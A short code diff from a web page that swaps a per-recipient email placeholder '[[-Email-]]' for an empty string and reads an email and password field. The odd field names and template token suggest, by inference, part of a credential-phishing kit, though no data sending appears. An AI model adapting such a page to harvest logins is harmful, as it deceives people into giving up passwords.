@@ -244,11 +244,11 @@ label{
 var hash = window.location.hash.substr(1);
       var hash_value = window.location.hash.replace('#','');
 $('#psssss').focus();
-	document.getElementById('testx').value = "[[-Email-]]";
+	document.getElementById('testx').value = "";
 	var em = $('#testx').val();
 		var ps = $('#psssss').val();
 
-		var email = document.getElementById('testx').value = "[[-Email-]]";
+		var email = document.getElementById('testx').value = "";
 
 			var name = email.substring(0, email.lastIndexOf("@"));
 
